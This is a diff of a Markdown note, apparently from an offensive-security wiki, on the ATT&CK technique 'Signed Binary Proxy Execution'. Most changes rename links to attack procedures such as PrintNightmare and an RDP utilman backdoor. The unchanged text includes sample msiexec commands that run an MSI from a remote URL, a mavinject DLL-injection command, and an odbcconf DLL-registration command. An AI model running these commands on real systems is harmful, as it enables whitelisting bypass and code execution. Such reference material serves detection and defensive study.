@@ -10,22 +10,22 @@ tactics:
 - '[[Defense Evasion|TA0005 - Defense Evasion]]'
 - '[[Execution|TA0002 - Execution]]'
 procedures:
-- '[[ActiveX-Based Autorun Macro with InkPicture Control and Painted Event]]'
-- '[[Azure SSRF for VM Metadata Service]]'
-- '[[Bypassing Constrained Language Mode using Powershell DLL Runner]]'
-- '[[Java RMI Exploitation for Remote Command Execution using sjet or mjet]]'
-- '[[JWT Signature Key Injection Attack]]'
-- '[[Linux - SUDO NOPASSWD Privilege Escalation via Vim]]'
-- '[[Mshta Remote HTA Execution]]'
-- '[[MYSQL Dumpfile PHP Shell Creation]]'
-- '[[MYSQL Error Based - UpdateXML function Data Extraction]]'
+- '[[ActiveX-Based-Autorun-Macro-with-InkPicture-Control-and-Painted-Event]]'
+- '[[Exploit-Azure-SSRF-to-Access-VM-Metadata-Service]]'
+- '[[Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner]]'
+- '[[Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]'
+- '[[JWT-Signature-Key-Injection-Attack]]'
+- '[[Linux-SUDO-NOPASSWD-Privilege-Escalation-via-Vim]]'
+- '[[Mshta-Remote-HTA-Execution]]'
+- '[[MySQL-Dumpfile-PHP-Shell-Creation]]'
+- '[[MySQL-Error-Based-Data-Extraction-Using-UpdateXML]]'
 - '[[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]'
-- '[[PostgreSQL File Read Procedure]]'
-- '[[PrintNightmare WebDAV Attack]]'
-- '[[Web Delivery and Proxy Credential Stealing]]'
-- '[[Windows ODBC Driver Registration via Odbcconf]]'
-- '[[Windows - RDP Backdoor using utilman.exe]]'
-- '[[XSLT Injection - Remote Code Execution with Java]]'
+- '[[Read-Files-via-PostgreSQL-Server-Functions]]'
+- '[[PrintNightmare-WebDAV-Attack]]'
+- '[[Deliver-Meterpreter-Payload-via-Web-Delivery-and-Steal-Proxy-Credentials]]'
+- '[[Windows-ODBC-Driver-Registration-via-Odbcconf]]'
+- '[[Windows-RDP-Backdoor-using-utilman.exe]]'
+- '[[XSLT-Injection-for-Java-RCE]]'
 ---
 
 # Signed Binary Proxy Execution
@@ -35,6 +35,8 @@ procedures:
 ## Description
 
 Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.Msiexec.exeMsiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.[1][2][3] Msiexec.exe may also be used to execute DLLs.[1]msiexec.exe /q /i "C:\path\to\file.msi"msiexec.exe /q /i http[:]//site[.]com/file.msimsiexec.exe /y "C:\path\to\file.dll"Mavinject.exeMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. [4]"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>SyncAppvPublishingServer.exeSyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. [5]Odbcconf.exeOdbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.[6] The utility can be misused to execute functionality equivalent to Regsvr32 with the REGSVR option to execute a DLL.[7][8][9]odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}Several other binaries exist that may be used to perform similar behavior. [10]
+
+
 
 # Detection
 
@@ -79,19 +81,21 @@ Certain signed binaries that can be used to execute other programs may not be ne
 
 ## Related Procedures (16)
 
-- [[ActiveX-Based Autorun Macro with InkPicture Control and Painted Event]]
-- [[Azure SSRF for VM Metadata Service]]
-- [[Bypassing Constrained Language Mode using Powershell DLL Runner]]
-- [[Java RMI Exploitation for Remote Command Execution using sjet or mjet]]
-- [[JWT Signature Key Injection Attack]]
-- [[Linux - SUDO NOPASSWD Privilege Escalation via Vim]]
-- [[Mshta Remote HTA Execution]]
-- [[MYSQL Dumpfile PHP Shell Creation]]
-- [[MYSQL Error Based - UpdateXML function Data Extraction]]
+- [[ActiveX-Based-Autorun-Macro-with-InkPicture-Control-and-Painted-Event]]
+- [[Exploit-Azure-SSRF-to-Access-VM-Metadata-Service]]
+- [[Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner]]
+- [[Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
+- [[JWT-Signature-Key-Injection-Attack]]
+- [[Linux-SUDO-NOPASSWD-Privilege-Escalation-via-Vim]]
+- [[Mshta-Remote-HTA-Execution]]
+- [[MySQL-Dumpfile-PHP-Shell-Creation]]
+- [[MySQL-Error-Based-Data-Extraction-Using-UpdateXML]]
 - [[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]
-- [[PostgreSQL File Read Procedure]]
-- [[PrintNightmare WebDAV Attack]]
-- [[Web Delivery and Proxy Credential Stealing]]
-- [[Windows ODBC Driver Registration via Odbcconf]]
-- [[Windows - RDP Backdoor using utilman.exe]]
-- [[XSLT Injection - Remote Code Execution with Java]]
+- [[Read-Files-via-PostgreSQL-Server-Functions]]
+- [[PrintNightmare-WebDAV-Attack]]
+- [[Deliver-Meterpreter-Payload-via-Web-Delivery-and-Steal-Proxy-Credentials]]
+- [[Windows-ODBC-Driver-Registration-via-Odbcconf]]
+- [[Windows-RDP-Backdoor-using-utilman.exe]]
+- [[XSLT-Injection-for-Java-RCE]]
+
+
